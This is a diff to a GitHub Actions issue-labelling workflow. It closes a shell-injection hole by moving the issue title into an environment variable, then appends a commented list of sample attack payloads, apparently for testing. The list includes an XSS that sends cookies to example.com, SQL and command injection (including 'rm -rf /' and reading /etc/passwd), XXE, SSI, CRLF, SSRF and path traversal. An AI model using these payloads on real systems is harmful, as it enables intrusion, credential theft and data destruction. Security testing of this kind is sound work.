@@ -8,10 +8,30 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Assign label
+        env:
+            TITLE: ${{ github.event.issue.title }}
         run: |
-          issue_title="${{ github.event.issue.title }}"
-          if [[ "$issue_title" == *"bug"* ]]; then
+          if [[ "$TITLE" == *"bug"* ]]; then
           echo "Issue is about a bug!"
           else
           echo "Issue is not about a bug"
           fi
+          
+          
+#          XSS => <script>document.location="https://www.example.com/index.php?coockie="+document.cookie;</script>
+#          SQL injection => ' OR '1'='1'; --'
+#          Command injection => ; cat /etc/passwd => 127.0.0.1; rm -rf /
+#          Path traversal => ../../../../../../etc/passwd
+#          LDAP injection => *)(uid=*))(|(uid=*
+#          XML injection => <?xml version="1.0" encoding="ISO-8859-1"?>
+#          <foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+#          SSI injection => <!--#exec cmd="ls"-->
+#          SMTP injection => RCPT TO: <script>alert('XSS')</script>@localhost
+#          Host header injection => Host: www.example.com%0D%0AAccept-Language:%20en-us%0D%0A%0D%0A
+#          CRLF injection => %0D%0A
+#          XXE injection => <?xml version="1.0" encoding="ISO-8859-1"?>
+#          <!DOCTYPE foo [<!ELEMENT foo ANY >
+#          <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+#          <foo>&xxe;</foo>
+#          Open redirect => https://www.example.com/index.php?redirect=https://www.example.com
+#          SSRF => https://www.example.com/index.php?url=https://www.example.com
